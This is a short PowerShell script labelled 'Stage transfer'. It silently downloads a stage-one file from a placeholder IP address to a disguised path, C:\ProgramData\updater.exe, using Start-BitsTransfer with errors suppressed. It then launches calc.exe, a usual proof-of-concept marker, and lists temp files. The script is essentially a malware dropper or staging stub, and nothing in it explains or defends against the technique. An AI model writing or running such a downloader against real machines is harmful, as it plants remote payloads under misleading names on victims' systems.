
<# Stage transfer #>
[CmdletBinding()]
param(
    [string]$TransferUrl = 'http://192.0.2.92/stage1.ps1',
    [string]$PayloadPath = 'C:\ProgramData\updater.exe',
    [int]$StageTimeout = 53
)
Start-BitsTransfer -Source $TransferUrl -Destination $PayloadPath -ErrorAction SilentlyContinue
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
